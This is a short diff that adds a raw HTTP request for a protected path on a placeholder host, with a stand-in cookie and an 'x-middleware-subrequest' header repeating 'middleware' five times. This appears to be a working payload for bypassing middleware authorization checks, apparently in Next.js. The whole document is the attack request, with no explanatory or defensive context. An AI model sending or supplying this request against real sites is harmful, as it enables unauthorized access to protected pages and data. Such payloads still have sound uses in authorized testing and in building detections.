@@ -1,0 +1,4 @@
+GET /real-protected-path HTTP/1.1
+Host: target.com
+Cookie: your_cookie_here
+x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
